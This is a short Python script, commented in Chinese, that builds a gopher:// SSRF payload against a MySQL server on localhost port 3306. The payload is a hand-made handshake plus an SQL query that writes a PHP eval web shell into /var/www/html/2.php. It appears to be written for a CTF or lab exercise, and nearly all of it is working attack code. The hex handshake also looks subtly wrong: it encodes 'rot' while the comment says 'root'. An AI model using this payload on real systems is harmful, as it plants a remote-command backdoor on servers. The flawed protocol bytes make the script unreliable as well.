import urllib.parse

def generate_gopher_payload():
    # 1. 构造MySQL协议握手包（模拟图片中的二进制数据）
    # 这是gopherus生成的核心部分，包含协议版本、权限等固定字节
    protocol_header = bytes.fromhex(
        "a300000085a6ff01"          # 协议头（包含协议版本、状态等）
        "0000000000000000"          # 填充字节
        "0000000000000000"          # 填充字节
        "0000000000000000"          # 填充字节
        "726f7400"                  # 用户名为 'root'（hex: 72 6f 74 00）
        "0000000000000000"          # 密码填充（空密码）
        "746573745f70617373776f726400"  # 数据库名（test_password）
    )

    # 2. 构造SQL查询（必须严格匹配图片语法）
    sql = 'SELECT "<?php @eval($_POST[\'cmd\']);?>" INTO OUTFILE \'/var/www/html/2.php\';'
    sql_bytes = sql.encode('latin1')  # 转换为二进制

    # 3. 合并协议头和SQL语句
    full_payload = protocol_header + sql_bytes

    # 4. 对二进制数据进行URL编码（保留%00等空字节）
    encoded = urllib.parse.quote(full_payload, safe='')

    # 5. 生成Gopher链接（注意格式中的`/_`和端口3306）
    gopher_url = f"gopher://127.0.0.1:3306/_{encoded}"
    return gopher_url

# 生成payload（直接调用无需参数）
payload = generate_gopher_payload()
print(payload)